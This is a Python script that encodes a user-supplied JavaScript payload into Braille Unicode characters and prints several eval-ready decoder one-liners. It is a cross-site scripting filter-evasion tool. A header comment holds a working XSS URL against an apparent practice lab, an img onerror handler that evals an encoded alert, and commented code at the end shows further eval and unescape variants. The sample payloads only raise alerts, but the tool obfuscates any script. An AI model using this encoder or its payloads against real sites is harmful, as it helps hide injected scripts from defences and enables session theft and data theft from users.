import argparse
# https://xss-labs.abay.sh/xss/1.php?q=<img%20src=""%20onerror="eval((`⡡⡬⡥⡲⡴⠨⠧⡲⡡⡰⡨⡺⡥⡲⠧⠩`.split(``).map(function(c){return%20String.fromCharCode(c.charCodeAt()-10240);}).join(``)));">
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

def brai_encode(payload):
    encoded_chars = []
    for char in payload:
        hex_char = format(ord(char), '02x')
        prefixed_hex = '28' + hex_char
        encoded_char = chr(int(prefixed_hex, 16))
        encoded_chars.append(encoded_char)
    return ''.join(encoded_chars)

def brai_xss_encode(payload):
    hex_string = ''.join([hex(ord(c))[2:].zfill(2) for c in payload])
    segments = [hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]
    prefixed_segments = ['28' + segment for segment in segments]
    encoded_string = ''.join([chr(int(segment, 16)) for segment in prefixed_segments])
    return encoded_string

def process_encoded_payload(encoded_payload):
    print(f"{CYAN}{RESET}")
    MY_LIST = [
        f"(Array.from(`{encoded_payload}`,c=>String.fromCharCode(c.charCodeAt()-0x2800)).join(''))",
        f"(Array.from(`{encoded_payload}`,c=>String.fromCharCode(c.charCodeAt()-10240)).join``)",
        f"(Array.from(`{encoded_payload}`).map(c=>String.fromCharCode(c.charCodeAt()-10240)).join(''))",
        f"([...`{encoded_payload}`].map(c=>String.fromCharCode(10240^c.charCodeAt())).join``)",
        f"([...`{encoded_payload}`].map(c=>String.fromCharCode(c.charCodeAt()-0x2800)).join(''))",
        f"([...`{encoded_payload}`].map(c=>String.fromCharCode(c.charCodeAt()^10240)).join(''))",
        f"(`{encoded_payload}`.split``.map(c=>String.fromCharCode(10240^c.charCodeAt())).join``)",
        f"(`{encoded_payload}`.split('').map(c=>String.fromCharCode(c.charCodeAt()-0x2800)).join(''))",
        f"(`{encoded_payload}`.split``.map(c=>String.fromCharCode(c.charCodeAt()-10240)).join``)",
    ]
    for item in MY_LIST:
        print(f"console.log({item});")

def main():
    parser = argparse.ArgumentParser(description=f"{YELLOW}Encode payload using brai_encode algorithm.{RESET}")
    parser.add_argument('-p', '--payload', required=True, help=f"{BLUE}Payload to encode{RESET}")
    args = parser.parse_args()

    encoded = brai_encode(args.payload)
    process_encoded_payload(encoded)

if __name__ == '__main__':
    main()



# original_payload = "alert('love')"
# encoded_payload = brai_xss_encode(original_payload)
# final_payload = f'unescape(escape`{encoded_payload}`.replace(/u(..)/g,"$1%"))'

# print("Original:", original_payload)
# print("Renniepak encoded with 28 prefix:", encoded_payload)
# print(f"eval([...`{encoded_payload}`].map(c=>String.fromCharCode(c.charCodeAt()-10240)).join``)")